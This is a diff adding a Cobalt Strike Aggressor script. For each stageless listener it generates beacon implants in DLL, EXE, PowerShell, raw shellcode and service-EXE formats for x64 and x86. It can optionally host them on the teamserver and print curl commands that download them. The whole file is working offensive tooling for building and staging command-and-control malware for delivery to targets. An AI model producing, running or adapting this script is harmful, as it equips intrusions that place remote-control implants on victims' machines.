@@ -1,0 +1,239 @@
+# Payload Generator
+# Author: @joevest
+# - Generates all payload types for each current listener
+# - Optional: Host each payload on the teamserver
+
+# Log script start to the console
+println("Payload Generator: Script loaded");
+
+# Directory for Payloads
+$payload_path = getFileProper(script_resource("/payloads"));
+
+# Default hosting port
+$host_port = 80; # Perhaps make this dynamic at some point by reading the c2profile?
+
+# Default SSL mode
+$host_ssl = false; # Perhaps make this dynamic at some point by reading the c2profile?
+
+# Base URL for Payload hosting
+$payload_base_url = "/payloads/";
+
+# Output tracker
+@payloads = @();
+
+println("Payload Generator: Payload output path: " . $payload_path);
+
+
+menubar("Payload Generator", "payloadgenerator");
+popup payloadgenerator {
+	item "&Generate Stagless Payloads" {
+		prompt_confirm("Generate stageless payloads?", "Payload Generator Confirmation", {
+			clean_payloads();
+			generate_stageless_Payloads(false);
+			show_message("Payloads saved to " . $payload_path);
+		});
+	}
+
+	item "&Generate and Host Stagless Payloads" {
+		prompt_confirm("Generate and Host Stageless Payloads?", "Payload Generator Confirmation", {
+			clean_payloads();
+			generate_stageless_Payloads(true);
+			show_message("Payloads saved to " . $payload_path);
+			print_download_script();
+		});
+	}
+}
+
+sub print_download_script {
+
+	println("\n");
+	println("Curl Payload Script");
+	println("\n");
+
+	foreach $site (sites()) {
+
+		if ($site["Type"] eq "page") {
+			println("curl -O -A payload_generator " .$site["Proto"] . $site["Host"] . ":" . $site["Port"] . $site["URI"]);
+		}
+	}
+	println("\n");
+
+}
+
+sub clean_payloads {
+	println("Payload Generator: Cleaning ". $payload_path );
+	@files = ls($payload_path);
+	foreach $file (@files) {
+		#println($file);
+		deleteFile($file);
+
+	}
+}
+
+sub create_payload_site {
+	local ('$site_host $site_port $site_uri $site_content $site_mimetype $site_description $site_ssl')
+
+	$data = $1;
+	$payload_url = $payload_base_url . $2;
+	#println(" Payload Hosted: ". $payload_url);
+
+	$site_hostip = localip();
+	$site_port = $host_port;
+	$site_uri = $payload_url;
+	$site_content = $data;
+	$site_mimetype = "text/plain";
+	$site_description = $2;
+	$site_ssl = $host_ssl;
+
+	# Remove site if exists
+	site_kill($site_port, $site_uri)
+	# Create new site
+	site_host($site_hostip, $site_port, $site_uri, $site_content, $site_mimetype, $site_description, $site_ssl);
+}
+
+sub generate_stageless_Payloads {
+
+	foreach $name (listeners_stageless()) {
+
+		if ($1) {
+			println("Payload Generator: Generating and Hosting Stageless Payloads for listener: $name");
+		} else {
+			println("Payload Generator: Generating Stageless Payloads for listener: $name");
+		}
+
+		#Stageless Payloads
+
+		# x64 dll
+		$payload_name = split("/",(listener_info($name,"payload")))[1] . "_". $name . "_x64.dll";
+		#println(" Payload Path: " . $payload_path . "/$payload_name");
+		$data = artifact_payload($name, "dll", "x64");
+		$cradle = openf(">" . $payload_path . "/$payload_name");
+		writeb($cradle, $data);
+		closef($cradle);
+		add(@payloads,"$payload_name",-1);
+
+		if ($1) {
+			create_payload_site($data, $payload_name);
+		}
+
+		# x86 dll
+		$payload_name = split("/",(listener_info($name,"payload")))[1] . "_". $name . "_x86.dll";
+		#println( " Payload Path: " . $payload_path . "/$payload_name");
+		$data = artifact_payload($name, "dll", "x86");
+		$cradle = openf(">" . $payload_path . "/$payload_name");
+		writeb($cradle, $data);
+		closef($cradle);	
+
+		add(@payloads,"$payload_name",-1);
+		if ($1) {
+			create_payload_site($data, $payload_name);
+		}	
+
+		# x64 exe
+		$payload_name = split("/",(listener_info($name,"payload")))[1] . "_". $name . "_x64.exe";
+		#println( " Payload Path: " . $payload_path . "/$payload_name");
+		$data = artifact_payload($name, "exe", "x64");
+		$cradle = openf(">" . $payload_path . "/$payload_name");
+		writeb($cradle, $data);
+		closef($cradle);
+
+		add(@payloads,"$payload_name",-1);
+		if ($1) {
+			create_payload_site($data, $payload_name);
+		}
+
+
+		# x86 exe
+		$payload_name = split("/",(listener_info($name,"payload")))[1] . "_". $name . "_x86.exe";
+		#println( " Payload Path: " . $payload_path . "/$payload_name");
+		$data = artifact_payload($name, "exe", "x86");
+		$cradle = openf(">" . $payload_path . "/$payload_name");
+		writeb($cradle, $data);
+		closef($cradle);		
+
+		add(@payloads,"$payload_name",-1);
+		if ($1) {
+			create_payload_site($data, $payload_name);
+		}
+
+		# x64 ps1
+		$payload_name = split("/",(listener_info($name,"payload")))[1] . "_". $name . "_x64.ps1";
+		#println( " Payload Path: " . $payload_path . "/$payload_name");
+		$data = artifact_payload($name, "powershell", "x64");
+		$cradle = openf(">" . $payload_path . "/$payload_name");
+		writeb($cradle, $data);
+		closef($cradle);
+
+		if ($1) {
+			create_payload_site($data, $payload_name);
+		}
+
+		# x86 ps1
+		$payload_name = split("/",(listener_info($name,"payload")))[1] . "_". $name . "_x86.ps1";
+		#println( " Payload Path: " . $payload_path . "/$payload_name");
+		$data = artifact_payload($name, "powershell", "x86");
+		$cradle = openf(">" . $payload_path . "/$payload_name");
+		writeb($cradle, $data);
+		closef($cradle);	
+
+		add(@payloads,"$payload_name",-1);
+		if ($1) {
+			create_payload_site($data, $payload_name);
+		}
+
+		# x64 bin
+		$payload_name = split("/",(listener_info($name,"payload")))[1] . "_". $name . "_x64.bin";
+		#println( " Payload Path: " . $payload_path . "/$payload_name");
+		$data = artifact_payload($name, "raw", "x64");
+		$cradle = openf(">" . $payload_path . "/$payload_name");
+		writeb($cradle, $data);
+		closef($cradle);
+
+		add(@payloads,"$payload_name",-1);
+		if ($1) {
+			create_payload_site($data, $payload_name);
+		}
+
+		# x86 bin
+		$payload_name = split("/",(listener_info($name,"payload")))[1] . "_". $name . "_x86.bin";
+		#println( " Payload Path: " . $payload_path . "/$payload_name");
+		$data = artifact_payload($name, "raw", "x86");
+		$cradle = openf(">" . $payload_path . "/$payload_name");
+		writeb($cradle, $data);
+		closef($cradle);	
+
+		add(@payloads,"$payload_name",-1);
+		if ($1) {
+			create_payload_site($data, $payload_name);
+		}
+
+		# x64 svc.exe
+		$payload_name = split("/",(listener_info($name,"payload")))[1] . "_". $name . "_x64.svc.exe";
+		#println( " Payload Path: " . $payload_path . "/$payload_name");
+		$data = artifact_payload($name, "svcexe", "x64");
+		$cradle = openf(">" . $payload_path . "/$payload_name");
+		writeb($cradle, $data);
+		closef($cradle);
+
+		add(@payloads,"$payload_name",-1);
+		if ($1) {
+			create_payload_site($data, $payload_name);
+		}
+
+		# x86 svc.exe
+		$payload_name = split("/",(listener_info($name,"payload")))[1] . "_". $name . "_x86.svc.exe";
+		#println( " Payload Path: " . $payload_path . "/$payload_name");
+		$data = artifact_payload($name, "svcexe", "x86");
+		$cradle = openf(">" . $payload_path . "/$payload_name");
+		writeb($cradle, $data);
+		closef($cradle);	
+
+		add(@payloads,"$payload_name",-1);
+		if ($1) {
+			create_payload_site($data, $payload_name);
+		}
+	}
+	println("Payload Generator: Payloads Saved at " . $payload_path);
+	println("Payload Generator: Format - beacon_<type>_<listener name>_<arch>.<ext>");
+
+}
